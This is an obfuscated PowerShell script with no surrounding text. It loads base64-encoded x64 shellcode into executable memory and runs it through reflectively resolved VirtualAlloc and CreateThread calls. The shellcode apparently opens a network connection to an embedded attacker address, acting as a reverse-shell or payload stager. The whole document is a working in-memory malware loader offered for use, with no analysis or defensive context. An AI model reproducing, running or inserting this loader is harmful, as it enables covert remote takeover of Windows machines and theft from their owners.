
function sP {
	Param ($eCWu, $u80Ku)		
	$dZ1 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $dZ1.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($dZ1.GetMethod('GetModuleHandle')).Invoke($null, @($eCWu)))), $u80Ku))
}

function dha {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $co26F,
		[Parameter(Position = 1)] [Type] $qSw = [Void]
	)
	
	$elb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$elb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $co26F).SetImplementationFlags('Runtime, Managed')
	$elb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $qSw, $co26F).SetImplementationFlags('Runtime, Managed')
	
	return $elb.CreateType()
}

[Byte[]]$bGRaZ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcke8ppkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$ygh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sP kernel32.dll VirtualAlloc), (dha @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $bGRaZ.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bGRaZ, 0, $ygh, $bGRaZ.length)

$ys = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sP kernel32.dll CreateThread), (dha @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ygh,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sP kernel32.dll WaitForSingleObject), (dha @([IntPtr], [Int32]))).Invoke($ys,0xffffffff) | Out-Null
